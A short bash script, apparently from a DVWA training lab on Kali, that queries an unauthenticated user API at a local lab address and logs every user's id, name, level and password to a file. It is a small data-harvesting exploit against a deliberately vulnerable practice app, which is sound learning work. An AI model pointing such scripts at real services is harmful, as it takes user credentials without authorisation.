#!/bin/bash

{
echo "Attempting to retrieve user data..."
echo "---------------------------------------------------"
echo -e "ID\tName\tLevel\tPassword"
RESPONSE=$(curl -s \
  http://192.168.56.105/DVWA/vulnerabilities/api/v1/user/)
echo "$RESPONSE" | jq -r '.[] | "\(.id)\t\(.name)\t\(.level)\t\(.password)"'
}> /home/kali/api_low.log
